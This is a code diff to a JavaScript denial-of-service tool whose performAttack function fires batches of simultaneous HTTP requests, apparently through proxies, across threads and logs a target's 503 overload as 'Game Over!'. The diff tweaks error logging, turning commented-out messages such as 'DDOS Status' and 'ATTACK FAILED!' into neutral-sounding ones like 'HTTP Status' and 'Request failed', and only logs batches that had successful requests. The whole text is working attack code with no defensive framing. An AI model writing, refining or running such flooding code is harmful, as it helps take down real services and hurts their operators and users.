@@ -184,20 +184,21 @@ const performAttack = async (url, agent, threadId) => {
     try {
         // Send all requests simultaneously
         const results = await Promise.allSettled(requests.map(request => request.catch(err => {
+            // Log specific errors for debugging
             if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
-                // console.log(rainbow(`Thread ${threadId}: Unable to Attack Target Server Refused!`));
+                console.log(rainbow(`Thread ${threadId}: Network error: ${err.code || err.message} (Possible proxy issue)`));
             } else if (err.response?.status === 404) {
-                // console.log(rainbow(`Thread ${threadId}: Target returned 404 (Not Found).`));
+                console.log(rainbow(`Thread ${threadId}: Target returned 404 (Not Found).`));
             } else if (err.response?.status === 503) {
                 console.log(rainbow(`Thread ${threadId}: Target under heavy load (503) - Game Over!`));
             } else if (err.response?.status === 502) {
                 console.log(rainbow(`Thread ${threadId}: Bad Gateway (502).`));
             } else if (err.response?.status === 403) {
-                // console.log(rainbow(`Thread ${threadId}: Forbidden (403).`));
+                console.log(rainbow(`Thread ${threadId}: Forbidden (403).`));
             } else if (err.response?.status) {
-                // console.log(rainbow(`Thread ${threadId}: DDOS Status: (${err.response?.status})`));
+                console.log(rainbow(`Thread ${threadId}: HTTP Status: ${err.response.status}`));
             } else {
-                // console.log(rainbow(`Thread ${threadId}: ${err.message || "ATTACK FAILED!"}`));
+                console.log(rainbow(`Thread ${threadId}: Request failed: ${err.message || "Unknown error"}`));
             }
             return null; // Return null for failed requests
         })));
@@ -208,10 +209,13 @@ const performAttack = async (url, agent, threadId) => {
         const successfulRequests = results.filter(result => result.status === 'fulfilled' && result.value).length;
         totalRequestsSent += successfulRequests;
 
-        console.log(rainbow(
-            `Thread ${threadId}: Completed batch of ${successfulRequests} successful requests ` +
-            `(Total sent: ${totalRequestsSent.toLocaleString()}) in ${(batchDuration / 1000).toFixed(2)} seconds`
-        ));
+        // Only log if there were successful requests
+        if (successfulRequests > 0) {
+            console.log(rainbow(
+                `Thread ${threadId}: Completed batch of ${successfulRequests} successful requests ` +
+                `(Total sent: ${totalRequestsSent.toLocaleString()}) in ${(batchDuration / 1000).toFixed(2)} seconds`
+            ));
+        }
 
         // Continue with the next batch if duration allows
         if (continueAttack) {
